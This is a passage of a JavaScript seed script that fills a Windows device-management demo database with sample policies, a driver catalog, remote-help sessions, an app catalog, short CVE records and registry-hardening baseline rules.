      'grp-all',
      'DENY_ALL', 1, 1,
      1, '[]', 0,
      '-3 days', '-3 days'
    );

    insertStorPol.run(
      'stor-dev-permissive-audit',
      'Developer & IT Admin Permissive USB Logging',
      'Permits all removable USB storage and peripherals while logging device insertions, serial numbers, and volume labels.',
      'grp-all',
      'ALLOW_ALL', 0, 0,
      0, '[]', 1,
      '-3 days', '-3 days'
    );
  }

  // 24. Delivery Optimization & Peer-to-Peer Cache Governance
  const doPolCount = db.prepare('SELECT COUNT(*) as count FROM delivery_optimization_policies').get().count;
  if (doPolCount === 0) {
    const insertDoPol = db.prepare(`
      INSERT OR IGNORE INTO delivery_optimization_policies (
        id, name, description, target_group_id,
        download_mode, group_id_guid, max_cache_size_pct,
        min_disk_size_gb, min_ram_capacity_gb, min_file_size_mb,
        max_background_download_pct, max_foreground_download_pct,
        max_upload_bandwidth_kbps, monthly_upload_cap_gb,
        cache_retention_days, enabled, created_at, updated_at
      ) VALUES (
        ?, ?, ?, ?,
        ?, ?, ?,
        ?, ?, ?,
        ?, ?,
        ?, ?,
        ?, 1, DATETIME('now', ?), DATETIME('now', ?)
      )
    `);

    insertDoPol.run(
      'do-corp-lan-peer',
      'Corporate High-Speed LAN Peering',
      'Enables local subnet peer-to-peer sharing of Windows Updates, Winget packages, and Store apps with 30% cache reservation and 14-day retention.',
      'grp-all',
      'LAN_PEER', '', 30,
      32, 4, 10,
      0, 0,
      0, 100,
      14,
      '-3 days', '-3 days'
    );

    insertDoPol.run(
      'do-branch-office-restricted',
      'Branch Office Bandwidth Saver',
      'Enforces strict group peering and background download rate limits (5 MB/s upload cap, 40% bandwidth cap) for bandwidth-constrained satellite locations.',
      'grp-workstations',
      'GROUP_PEER', 'e9c7a230-58d1-4cb5-8d5f-9e79d1a3848b', 20,
      64, 8, 25,
      40, 60,
      5120, 25,
      30,
      '-3 days', '-3 days'
    );

    insertDoPol.run(
      'do-developer-bypass',
      'Developer Direct CDN Fast Path',
      'Bypasses peer caching and fetches packages directly from Microsoft CDN with minimal cache footprint for development rigs.',
      'grp-all',
      'HTTP_ONLY', '', 10,
      16, 2, 50,
      0, 0,
      0, 0,
      3,
      '-3 days', '-3 days'
    );
  }

  // 25. Device Firmware Configuration Interface (DFCI) & UEFI BIOS Governance
  const dfciPolCount = db.prepare('SELECT COUNT(*) as count FROM dfci_policies').get().count;
  if (dfciPolCount === 0) {
    const insertDfciPol = db.prepare(`
      INSERT OR IGNORE INTO dfci_policies (
        id, name, description, target_group_id,
        cameras_enabled, microphones_enabled, radios_enabled,
        external_media_boot_enabled, network_adapter_boot_enabled,
        prevent_user_bios_changes, require_secure_boot, require_tpm2,
        require_kernel_dma, require_vbs, uefi_password_protection,
        enabled, created_at, updated_at
      ) VALUES (
        ?, ?, ?, ?,
        ?, ?, ?,
        ?, ?,
        ?, ?, ?,
        ?, ?, ?,
        1, DATETIME('now', ?), DATETIME('now', ?)
      )
    `);

    insertDfciPol.run(
      'dfci-zero-trust-hardened',
      'Zero-Trust High Security Firmware Baseline',
      'Enforces UEFI Secure Boot, TPM 2.0, Kernel DMA Protection, and blocks external USB and PXE network booting to prevent pre-boot rootkits.',
      'grp-all',
      1, 1, 1,
      0, 0,
      1, 1, 1,
      1, 1, 'ADMIN_PASSWORD',
      '-3 days', '-3 days'
    );

    insertDfciPol.run(
      'dfci-kiosk-lockdown',
      'Public Kiosk & Exam Hardware Lockdown',
      'Firmware-level hardware isolation: disables built-in cameras, microphones, radios (Bluetooth/Wi-Fi), and USB boot at the motherboard layer.',
      'grp-all',
      0, 0, 0,
      0, 0,
      1, 1, 1,
      0, 0, 'ADMIN_PASSWORD',
      '-3 days', '-3 days'
    );

    insertDfciPol.run(
      'dfci-developer-flexible',
      'Developer & Engineering Firmware Baseline',
      'Enables external media boot and virtualization extensions while auditing Secure Boot, TPM 2.0, and hardware root-of-trust.',
      'grp-workstations',
      1, 1, 1,
      1, 1,
      0, 1, 1,
      0, 0, 'NONE',
      '-3 days', '-3 days'
    );
  }

  // 47. Seed WIP Policies
  const wipCount = db.prepare("SELECT COUNT(*) as c FROM wip_policies").get().c;
  if (wipCount === 0) {
    const insertWipPol = db.prepare(`
      INSERT INTO wip_policies (
        id, name, description, target_group_id, enforcement_level, enterprise_domain,
        protected_apps_json, network_boundaries_json, allow_user_decryption,
        show_wip_overlays, revoke_on_unenroll, enabled, created_at, updated_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, DATETIME('now', ?), DATETIME('now', ?))
    `);

    const defaultApps = JSON.stringify([
      { name: 'Microsoft Edge', binary: 'msedge.exe', allowed: true },
      { name: 'Microsoft Outlook', binary: 'outlook.exe', allowed: true },
      { name: 'Microsoft Teams', binary: 'ms-teams.exe', allowed: true },
      { name: 'Visual Studio Code', binary: 'code.exe', allowed: true },
      { name: 'OneDrive for Business', binary: 'onedrive.exe', allowed: true }
    ]);

    const defaultBoundaries = JSON.stringify([
      { name: 'Corporate Intranet', domain: 'localpilot.internal', type: 'CLOUD_RESOURCE' },
      { name: 'Local Subnet', domain: '10.0.0.0/8', type: 'IPV4_RANGE' },
      { name: 'Office 365 Enterprise', domain: '*.sharepoint.com', type: 'ENTERPRISE_BOUNDARY' }
    ]);

    insertWipPol.run(
      'wip-corp-block-hardened',
      'Enterprise Corporate Strict Data Isolation',
      'Enforces strict data separation: blocks copying corporate text to unmanaged apps, personal cloud storage, and unencrypted drives.',
      'grp-all',
      'BLOCK',
      'localpilot.internal',
      defaultApps,
      defaultBoundaries,
      0, 1, 1,
      '-3 days', '-3 days'
    );

    insertWipPol.run(
      'wip-corp-override-audited',
      'Business Workstation Managed Audited Override',
      'Prompts user with warning and mandatory justification when transferring corporate content to personal applications.',
      'grp-workstations',
      'OVERRIDE',
      'localpilot.internal',
      defaultApps,
      defaultBoundaries,
      1, 1, 1,
      '-3 days', '-3 days'
    );

    insertWipPol.run(
      'wip-byod-silent-discovery',
      'BYOD Silent Discovery & Boundary Audit',
      'Passively monitors and logs corporate data boundary transitions without blocking user actions.',
      'grp-all',
      'SILENT',
      'localpilot.internal',
      defaultApps,
      defaultBoundaries,
      1, 0, 0,
      '-3 days', '-3 days'
    );
  }

  // Seed Windows Hello for Business & FIDO2 Passwordless Policies
  const whfbCount = db.prepare("SELECT COUNT(*) as c FROM whfb_policies").get().c;
  if (whfbCount === 0) {
    const insertWhfbPol = db.prepare(`
      INSERT INTO whfb_policies (
        id, name, description, target_group_id, state,
        min_pin_length, max_pin_length, pin_uppercase, pin_lowercase,
        pin_special_chars, pin_digits, pin_expiration_days, pin_history_count,
        allow_biometrics, require_enhanced_anti_spoofing, use_tpm_only,
        allow_fido2_security_keys, enabled, created_at, updated_at
      ) VALUES (
        ?, ?, ?, ?, ?,
        ?, ?, ?, ?,
        ?, ?, ?, ?,
        ?, ?, ?,
        ?, 1, DATETIME('now', ?), DATETIME('now', ?)
      )
    `);

    insertWhfbPol.run(
      'whfb-corp-strict',
      'Enterprise Passwordless Zero-Trust WHfB Baseline',
      'Mandates hardware TPM 2.0 key attestation, biometrics with enhanced anti-spoofing, 8+ character alphanumeric PINs, and FIDO2 keys.',
      'grp-all',
      'ENABLED',
      8, 127, 'ALLOWED', 'ALLOWED', 'ALLOWED', 'REQUIRED', 90, 5,
      1, 1, 1, 1,
      '-3 days', '-3 days'
    );

    insertWhfbPol.run(
      'whfb-standard-workstation',
      'Standard Workstation PIN & Biometrics',
      'Enables Windows Hello PIN and biometric sign-in with software TPM fallback allowed for non-TPM workstations.',
      'grp-workstations',
      'ENABLED',
      6, 64, 'ALLOWED', 'ALLOWED', 'ALLOWED', 'REQUIRED', 0, 0,
      1, 0, 0, 1,
      '-3 days', '-3 days'
    );

    insertWhfbPol.run(
      'whfb-kiosk-disallowed',
      'Kiosk & Shared Workstation WHfB Lockout',
      'Disables Windows Hello for Business enrollment on shared public kiosk terminals and exam machines.',
      'grp-family-laptops',
      'DISABLED',
      6, 127, 'DISALLOWED', 'DISALLOWED', 'DISALLOWED', 'ALLOWED', 0, 0,
      0, 0, 0, 0,
      '-3 days', '-3 days'
    );
  }

  // Seed Windows Driver & Firmware Update Policies and Catalog
  const drvCount = db.prepare("SELECT COUNT(*) as c FROM driver_update_policies").get().c;
  if (drvCount === 0) {
    const insertDrvPol = db.prepare(`
      INSERT INTO driver_update_policies (
        id, name, description, target_group_id, approval_method,
        automatic_approval_delay_days, allow_optional_drivers, enabled,
        created_at, updated_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, 1, DATETIME('now', ?), DATETIME('now', ?))
    `);

    insertDrvPol.run(
      'drv-pol-recommended',
      'Corporate Fleet Recommended Drivers',
      'Automatically approves and deploys certified OEM drivers after a 7-day stability testing period.',
      'grp-all',
      'AUTOMATIC',
      7, 1,
      '-3 days', '-3 days'
    );

    insertDrvPol.run(
      'drv-pol-conservative',
      'Critical Infrastructure Conservative Drivers',
      'Requires explicit IT administrator approval before installing any driver or firmware package.',
      'grp-workstations',
      'MANUAL',
      14, 0,
      '-3 days', '-3 days'
    );

    insertDrvPol.run(
      'drv-pol-canary',
      'Fast IT Pilot Driver Canary',
      'Immediate automatic deployment of latest release drivers with zero day deferral.',
      'grp-family-laptops',
      'AUTOMATIC',
      0, 1,
      '-3 days', '-3 days'
    );

    // Seed Driver Catalog
    const insertDrvCat = db.prepare(`
      INSERT INTO fleet_driver_catalog (
        id, driver_name, driver_class, driver_provider, driver_version,
        driver_date, hardware_id, approval_status, approved_at, approved_by,
        applicable_devices_count, installed_devices_count, created_at, updated_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?), DATETIME('now', ?))
    `);

    insertDrvCat.run(
      'drv-intel-wifi',
      'Intel(R) Wi-Fi 6E AX211 160MHz',
      'NET',
      'Intel',
      '23.30.0.6',
      '2024-02-15',
      'PCI\\VEN_8086&DEV_7A70',
      'APPROVED',
      new Date().toISOString(),
      'LocalPilot Administrator',
      3, 3,
      '-3 days', '-3 days'
    );

    insertDrvCat.run(
      'drv-nvidia-display',
      'NVIDIA GeForce Game Ready Driver',
      'DISPLAY',
      'NVIDIA',
      '552.22',
      '2024-04-16',
      'PCI\\VEN_10DE&DEV_2484',
      'APPROVED',
      new Date().toISOString(),
      'LocalPilot Administrator',
      2, 2,
      '-3 days', '-3 days'
    );

    insertDrvCat.run(
      'drv-realtek-audio',
      'Realtek High Definition Audio Driver',
      'MEDIA',
      'Realtek',
      '6.0.9652.1',
      '2024-03-01',
      'HDAUDIO\\FUNC_01&VEN_10EC',
      'APPROVED',
      new Date().toISOString(),
      'LocalPilot Administrator',
      3, 3,
      '-3 days', '-3 days'
    );

    insertDrvCat.run(
      'drv-dell-firmware',
      'Dell System Firmware UEFI Update',
      'FIRMWARE',
      'Dell Inc.',
      '1.21.0',
      '2024-05-10',
      'UEFI\\RES_{A5B6C7D8}',
      'PENDING_REVIEW',
      null,
      '',
      1, 0,
      '-3 days', '-3 days'
    );
  }

  // 35. Remote Help Roles & Seed Session
  const rhRoleCount = db.prepare('SELECT COUNT(*) as count FROM remote_help_roles').get().count;
  if (rhRoleCount === 0) {
    const insertRole = db.prepare(`
      INSERT INTO remote_help_roles (id, name, description, can_request_full_control, can_request_elevation, can_unattended, target_group_id, enabled, created_at, updated_at)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?), DATETIME('now', ?))
    `);

    insertRole.run(
      'rh-role-tier1',
      'Tier 1 Helpdesk Attended Operator',
      'Screen viewing and interactive mouse/keyboard control with user consent. No UAC elevation or unattended access.',
      1, 0, 0, null, 1, '-7 days', '-7 days'
    );

    insertRole.run(
      'rh-role-tier2-admin',
      'Tier 2 Desktop Systems Engineering',
      'Full interactive control with elevation privileges to enter local admin credentials across UAC secure desktops.',
      1, 1, 0, null, 1, '-7 days', '-7 days'
    );

    insertRole.run(
      'rh-role-unattended-ops',
      'Server & Kiosk Unattended Operations',
      'Unattended maintenance and remediation access for headless workstations, digital signage, and server nodes.',
      1, 1, 1, null, 1, '-7 days', '-7 days'
    );
  }

  const rhSessCount = db.prepare('SELECT COUNT(*) as count FROM remote_help_sessions').get().count;
  if (rhSessCount === 0) {
    const sampleDevice = db.prepare("SELECT id FROM devices WHERE hostname = 'DESKTOP-R0H12DJ' LIMIT 1").get()
      || db.prepare("SELECT id FROM devices LIMIT 1").get();
    
    if (sampleDevice) {
      const insertSess = db.prepare(`
        INSERT INTO remote_help_sessions (id, session_code, device_id, sharer_user, helper_user, session_type, status, unattended_enabled, started_at, ended_at, expires_at, created_at, updated_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', '-2 hours'), DATETIME('now', '-1 hours'), DATETIME('now', '+15 minutes'), DATETIME('now', '-2 hours'), DATETIME('now', '-1 hours'))
      `);
      insertSess.run(
        'sess-sample-completed',
        '482910',
        sampleDevice.id,
        'Tony',
        'Helpdesk Tier 1 Admin',
        'FULL_CONTROL',
        'COMPLETED',
        0
      );

      const insertAudit = db.prepare(`
        INSERT INTO remote_help_audit_log (id, session_id, device_id, actor_user, action, details, timestamp)
        VALUES (?, ?, ?, ?, ?, ?, DATETIME('now', ?))
      `);
      insertAudit.run('rh-audit-1', 'sess-sample-completed', sampleDevice.id, 'Helpdesk Tier 1 Admin', 'SESSION_REQUESTED', '6-digit PIN 482910 generated for attended support', '-2 hours');
      insertAudit.run('rh-audit-2', 'sess-sample-completed', sampleDevice.id, 'Tony', 'SESSION_STARTED', 'User Tony accepted remote assistance session', '-2 hours');
      insertAudit.run('rh-audit-3', 'sess-sample-completed', sampleDevice.id, 'Helpdesk Tier 1 Admin', 'CONTROL_GRANTED', 'Interactive mouse and keyboard control granted by user', '-110 minutes');
      insertAudit.run('rh-audit-4', 'sess-sample-completed', sampleDevice.id, 'Helpdesk Tier 1 Admin', 'SESSION_TERMINATED', 'Assistance session concluded successfully', '-1 hours');
    }
  }

  // 36. Feature Update Policies & Expedited Quality Updates Seeds
  const featPolCount = db.prepare('SELECT COUNT(*) as count FROM feature_update_policies').get().count;
  if (featPolCount === 0) {
    const insertFeat = db.prepare(`
      INSERT INTO feature_update_policies (id, name, description, target_group_id, target_os_version, rollout_type, safeguard_holds_enabled, enabled, created_at, updated_at)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?), DATETIME('now', ?))
    `);

    insertFeat.run(
      'feat-pol-w11-23h2-pin',
      'Windows 11 23H2 Enterprise Version Lock',
      'Pins all production workstations to Windows 11 23H2, preventing automatic feature upgrades to 24H2 until validated.',
      null,
      'Windows 11, version 23H2',
      'IMMEDIATELY',
      1, 1, '-10 days', '-10 days'
    );

    insertFeat.run(
      'feat-pol-w11-24h2-canary',
      'Windows 11 24H2 Canary Staging Profile',
      'Targets early adopter developer and testing rigs for Windows 11 24H2 rollout.',
      null,
      'Windows 11, version 24H2',
      'IMMEDIATELY',
      1, 1, '-10 days', '-10 days'
    );
  }

  const expUpdCount = db.prepare('SELECT COUNT(*) as count FROM expedited_quality_updates').get().count;
  if (expUpdCount === 0) {
    const insertExp = db.prepare(`
      INSERT INTO expedited_quality_updates (id, name, description, target_group_id, target_kb_number, cve_reference, days_until_forced_reboot, override_active_hours, status, created_at, updated_at)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?), DATETIME('now', ?))
    `);

      insertExp.run(
      'exp-update-zero-day',
      'Emergency 0-Day Hotfix Expedite (KB5044284)',
      'Critical zero-day patch expediting security fixes for Windows kernel privilege escalation vulnerabilities.',
      null,
      'KB5044284',
      'CVE-2026-21840',
      0,
      1,
      'ACTIVE',
      '-2 days', '-2 days'
    );
  }

  // 37. Enterprise Application Management & Company Portal Seeds
  const appCatCount = db.prepare('SELECT COUNT(*) as count FROM enterprise_app_catalog').get().count;
  if (appCatCount === 0) {
    const insertApp = db.prepare(`
      INSERT INTO enterprise_app_catalog (id, name, publisher, category, version, package_identifier, source_type, silent_install_args, silent_uninstall_args, icon_url, featured, self_service_enabled, license_type, total_licenses, created_at, updated_at)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?), DATETIME('now', ?))
    `);

    insertApp.run(
      'app-vscode',
      'Visual Studio Code',
      'Microsoft Corporation',
      'Developer Tools',
      '1.93.1',
      'Microsoft.VisualStudioCode',
      'WINGET',
      '--silent --accept-package-agreements --accept-source-agreements',
      '--silent',
      'https://code.visualstudio.com/favicon.ico',
      1, 1, 'FREE', 0, '-10 days', '-10 days'
    );

    insertApp.run(
      'app-chrome',
      'Google Chrome Enterprise',
      'Google LLC',
      'Productivity & Browsers',
      '128.0.6613.120',
      'Google.Chrome',
      'WINGET',
      '--silent --accept-package-agreements --accept-source-agreements',
      '--silent',
      'https://www.google.com/chrome/static/images/favicons/favicon-32x32.png',
      1, 1, 'FREE', 0, '-10 days', '-10 days'
    );

    insertApp.run(
      'app-docker',
      'Docker Desktop',
      'Docker Inc.',
      'Developer Tools',
      '4.34.2',
      'Docker.DockerDesktop',
      'WINGET',
      '--silent --accept-package-agreements --accept-source-agreements',
      '--silent',
      'https://www.docker.com/wp-content/uploads/2023/04/cropped-Docker-favicon-32x32.png',
      1, 1, 'PER_USER', 25, '-10 days', '-10 days'
    );

    insertApp.run(
      'app-slack',
      'Slack Enterprise',
      'Slack Technologies',
      'Collaboration',
      '4.39.95',
      'SlackTechnologies.Slack',
      'WINGET',
      '--silent --accept-package-agreements --accept-source-agreements',
      '--silent',
      'https://a.slack-edge.com/80588/marketing/img/meta/favicon-32.png',
      1, 1, 'PER_USER', 50, '-10 days', '-10 days'
    );

    insertApp.run(
      'app-7zip',
      '7-Zip File Archiver',
      'Igor Pavlov',
      'Utilities',
      '24.08',
      '7zip.7zip',
      'WINGET',
      '--silent --accept-package-agreements --accept-source-agreements',
      '--silent',
      'https://www.7-zip.org/favicon.ico',
      0, 1, 'OPEN_SOURCE', 0, '-10 days', '-10 days'
    );

    insertApp.run(
      'app-git',
      'Git for Windows',
      'The Git Development Community',
      'Developer Tools',
      '2.46.0',
      'Git.Git',
      'WINGET',
      '--silent --accept-package-agreements --accept-source-agreements',
      '--silent',
      'https://git-scm.com/favicon.ico',
      0, 1, 'OPEN_SOURCE', 0, '-10 days', '-10 days'
    );

    const sampleDev = db.prepare('SELECT id FROM devices LIMIT 1').get();
    if (sampleDev) {
      const insertLic = db.prepare(`
        INSERT INTO app_license_allocations (id, catalog_app_id, device_id, user_name, license_key, status, allocated_at, created_at, updated_at)
        VALUES (?, ?, ?, ?, ?, ?, DATETIME('now', '-5 days'), DATETIME('now', '-5 days'), DATETIME('now', '-5 days'))
      `);
      insertLic.run('lic-sample-docker', 'app-docker', sampleDev.id, 'Tony', 'DKR-ENT-8849-XXXX-2026', 'ACTIVE');

      const insertReq = db.prepare(`
        INSERT INTO company_portal_requests (id, catalog_app_id, device_id, user_name, request_type, status, approval_required, approver_user, justification, requested_at, resolved_at, created_at, updated_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', '-3 days'), DATETIME('now', '-3 days'), DATETIME('now', '-3 days'), DATETIME('now', '-3 days'))
      `);
      insertReq.run('req-sample-vscode', 'app-vscode', sampleDev.id, 'Tony', 'INSTALL', 'COMPLETED', 0, 'AutoApproved', 'Core workstation IDE');
    }
  }

  // 38. Vulnerability Management (TVM) & Security Baselines Seeds
  const vulnCount = db.prepare('SELECT COUNT(*) as count FROM security_vulnerabilities').get().count;
  if (vulnCount === 0) {
    const insertVuln = db.prepare(`
      INSERT INTO security_vulnerabilities (cve_id, title, description, software_name, affected_versions, cvss_score, severity, exploit_status, patch_status, cpe_identifier, remediation_guidance, published_date, created_at, updated_at)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?), DATETIME('now', ?))
    `);

    insertVuln.run(
      'CVE-2026-21840',
      'Windows Kernel Local Privilege Escalation Vulnerability',
      'Flaw in ntoskrnl.exe memory management allowing standard user to acquire NT AUTHORITY\\SYSTEM privileges.',
      'Windows 11 Enterprise',
      '< 22631.4317',
      8.8,
      'HIGH',
      'ACTIVE_EXPLOIT_POC',
      'VENDOR_PATCH_AVAILABLE',
      'cpe:2.3:o:microsoft:windows_11:*:*:*:*:*:*:*:*',
      'Deploy emergency expedited quality update KB5044284 or upgrade to 24H2 baseline.',
      '2026-08-12',
      '-20 days', '-20 days'
    );

    insertVuln.run(
      'CVE-2026-30122',
      'OpenSSL Handshake Parsing Heap Buffer Overflow (RCE)',
      'Remote code execution vulnerability during TLS 1.3 key exchange message parsing with zero authentication.',
      'OpenSSL',
      '< 3.3.2',
      9.8,
      'CRITICAL',
      'WEAPONIZED_WILD',
      'VENDOR_PATCH_AVAILABLE',
      'cpe:2.3:a:openssl:openssl:*:*:*:*:*:*:*:*',
      'Upgrade OpenSSL packages to 3.3.2 or later across all developer and server runtimes.',
      '2026-08-25',
      '-15 days', '-15 days'
    );

    insertVuln.run(
      'CVE-2025-49211',
      'Google Chrome V8 Engine Type Confusion Remote Code Execution',
      'Type confusion in V8 JavaScript engine allowing sandbox escape and arbitrary memory execution.',
      'Google Chrome',
      '< 128.0.6613.120',
      8.8,
      'HIGH',
      'ACTIVE_EXPLOIT_POC',
      'VENDOR_PATCH_AVAILABLE',
      'cpe:2.3:a:google:chrome:*:*:*:*:*:*:*:*',
      'Update Google Chrome Enterprise via Enterprise App Management to version 128.0.6613.120+.',
      '2026-08-28',
      '-12 days', '-12 days'
    );

    insertVuln.run(
      'CVE-2024-38063',
      'Windows TCP/IP Remote Code Execution Vulnerability',
      'Integer underflow in Windows IPv6 packet processing allowing unauthenticated remote code execution.',
      'Windows TCP/IP Stack',
      '< 22631.4037',
      9.8,
      'CRITICAL',
      'ACTIVE_EXPLOIT_POC',
      'VENDOR_PATCH_AVAILABLE',
      'cpe:2.3:o:microsoft:windows_11:*:*:*:*:*:*:*:*',
      'Apply Microsoft August cumulative update or temporarily disable IPv6 on untrusted network interfaces.',
      '2024-08-13',
      '-30 days', '-30 days'
    );

    insertVuln.run(
      'CVE-2023-4863',
      'libwebp Lossless Compression Heap Buffer Overflow',
      'Out-of-bounds write in libwebp rendering allowing remote code execution via malicious WebP image containers.',
      '7-Zip File Archiver',
      '< 24.08',
      8.8,
      'HIGH',
      'WEAPONIZED_WILD',
      'VENDOR_PATCH_AVAILABLE',
      'cpe:2.3:a:7-zip:7-zip:*:*:*:*:*:*:*:*',
      'Update 7-Zip archiver to version 24.08 or later using WinGet package repository.',
      '2023-09-12',
      '-40 days', '-40 days'
    );
  }

  const baselineCount = db.prepare('SELECT COUNT(*) as count FROM security_baseline_assessments').get().count;
  if (baselineCount === 0) {
    const insertBase = db.prepare(`
      INSERT INTO security_baseline_assessments (id, name, category, description, target_group_id, baseline_type, enforcement_rules, enabled, created_at, updated_at)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?), DATETIME('now', ?))
    `);

    const baselineRules = JSON.stringify([
      {
        id: 'rule-lsa-prot',
        name: 'Enable LSA Protection (RunAsPPL)',
        registry_path: 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa',
        value_name: 'RunAsPPL',
        expected_value: 1,
        remediation_script: 'Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa" -Name "RunAsPPL" -Value 1 -Type DWord'
      },
      {
        id: 'rule-cred-guard',
        name: 'Enable Windows Defender Credential Guard',
        registry_path: 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard',
        value_name: 'EnableVirtualizationBasedSecurity',
        expected_value: 1,
        remediation_script: 'Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -Value 1 -Type DWord'
      },
      {
        id: 'rule-smbv1',
        name: 'Disable Insecure Legacy SMBv1 Protocol',
        registry_path: 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters',
        value_name: 'SMB1',
        expected_value: 0,
        remediation_script: 'Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters" -Name "SMB1" -Value 0 -Type DWord'
      },
      {
        id: 'rule-ps-logging',
        name: 'Enforce PowerShell Script Block Logging (Event 4104)',
        registry_path: 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging',
        value_name: 'EnableScriptBlockLogging',
        expected_value: 1,
        remediation_script: 'New-Item -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" -Force -ErrorAction SilentlyContinue; Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1 -Type DWord'
      }
    ]);

    insertBase.run(
      'base-win11-sec-baseline',
      'Windows 11 Enterprise Hardened Security Baseline',
      'OPERATING_SYSTEM',
      'Microsoft Intune recommended security baseline enforcing LSA Protection, Credential Guard, SMBv1 disabling, and Script Block Logging.',
      null,
      'WINDOWS_11_ENTERPRISE',
      baselineRules,
      1,
      '-15 days', '-15 days'
    );

    const sampleDev = db.prepare('SELECT id FROM devices LIMIT 1').get();
    if (sampleDev) {
      const insertDevVuln = db.prepare(`
        INSERT INTO device_vulnerabilities (id, device_id, cve_id, detected_software_name, detected_version, status, risk_score, first_detected_at, created_at, updated_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, DATETIME('now', '-5 days'), DATETIME('now', '-5 days'), DATETIME('now', '-5 days'))
      `);

      insertDevVuln.run(
        'dv-sample-1',
        sampleDev.id,
        'CVE-2026-21840',
        'Windows 11 Enterprise',
        '22631.3880',
        'ACTIVE',
        8.8
      );

      insertDevVuln.run(
        'dv-sample-2',
        sampleDev.id,
        'CVE-2024-38063',
        'Windows TCP/IP Stack',
        '22631.3880',
        'ACTIVE',
        9.8
      );
    }
  }

  // 33. Seed Windows Autopatch Cadence & Staged Deployment Rings
  const autopatchRingsCount = db.prepare('SELECT COUNT(*) as c FROM autopatch_rings').get().c;
  if (autopatchRingsCount === 0) {
    const insertRing = db.prepare(`
      INSERT INTO autopatch_rings (id, name, phase_order, deferral_days, target_device_percentage, max_allowable_crash_rate, min_success_rate, target_group_id)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    `);
    insertRing.run('ring-test', 'Test (Canary / IT Admin Validation)', 1, 0, 5.0, 0.0, 100.0, 'grp-all');
    insertRing.run('ring-first', 'First (1% Early Adopters Ring)', 2, 2, 10.0, 1.5, 98.0, 'grp-all');
    insertRing.run('ring-fast', 'Fast (9% Rapid Fleet Deployment)', 3, 4, 25.0, 2.0, 95.0, 'grp-all');
    insertRing.run('ring-broad', 'Broad (90% General Availability Fleet)', 4, 7, 60.0, 2.0, 95.0, 'grp-all');

    const insertRelease = db.prepare(`
      INSERT INTO autopatch_release_cadence (id, name, release_month, release_type, target_kb_numbers, approval_status, active_phase, scheduled_start_date, broad_target_date)
      VALUES (?, ?, ?, ?, ?, ?, ?, DATETIME('now', '-3 days'), DATETIME('now', '+7 days'))
    `);
    insertRelease.run(
      'rel-2026-09-b',
      'Windows 11 September 2026 Quality Update (B-Release)',
      '2026-09',
      'SECURITY_QUALITY',
      'KB5044284, KB5044310',
      'AUTOMATIC_APPROVED',
      'FIRST'
    );

    const primaryDev = db.prepare("SELECT id FROM devices LIMIT 1").get();
    if (primaryDev) {
      db.prepare(`
        INSERT OR IGNORE INTO autopatch_device_deployments (id, release_id, device_id, ring_id, install_status, applied_kb, exit_code, post_patch_crashes, installed_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', '-1 day'))
      `).run(
        'dep-primary-01',
        'rel-2026-09-b',
        primaryDev.id,
        'ring-first',
        'INSTALLED',
        'KB5044284',
        0,
        0
      );
    }
  }

  // 34. Seed Windows 365 Cloud PC & Virtual Workstations
  const cpcPolicyCount = db.prepare('SELECT COUNT(*) as c FROM cloud_pc_provisioning_policies').get().c;
  if (cpcPolicyCount === 0) {
    const insertPolicy = db.prepare(`
      INSERT INTO cloud_pc_provisioning_policies (id, name, description, sku_name, vcpu_count, ram_gb, storage_gb, os_image, join_type, target_group_id)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);
    insertPolicy.run(
      'cpc-pol-developer',
      'Engineering & Developer High-Perf Cloud PC',
      '8vCPU / 32GB RAM developer workstation optimized for Visual Studio, Docker, and local AI inferencing.',
      'Premium 8vCPU / 32GB RAM / 512GB Storage',
      8,
      32,
      512,
      'Windows 11 Enterprise 24H2 Dev Edition',
      'ENTRA_JOIN',
      'grp-all'
    );
    insertPolicy.run(
      'cpc-pol-standard',
      'Standard Knowledge Worker Virtual PC',
      'General productivity virtual workstation with Office 365 and Edge.',
      'Standard 2vCPU / 8GB RAM / 128GB Storage',
      2,
      8,
      128,
      'Windows 11 Enterprise 24H2',
      'LOCAL_HYPERV_STANDALONE',
      'grp-all'
    );

    const dev = db.prepare('SELECT id FROM devices LIMIT 1').get();
    const hostId = dev ? dev.id : null;

    const insertCpc = db.prepare(`
      INSERT INTO cloud_pc_instances (id, policy_id, name, hostname, primary_user, host_device_id, provisioning_status, ip_address, ram_bytes, disk_free_gb)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);
    insertCpc.run(
      'cpc-inst-01',
      'cpc-pol-developer',
      'CloudPC-Tony-DevBox',
      'CPC-TONY-DEV01',
      'Tony',
      hostId,
      'PROVISIONED',
      '192.168.1.185',
      34359738368,
      380.5
    );
    insertCpc.run(
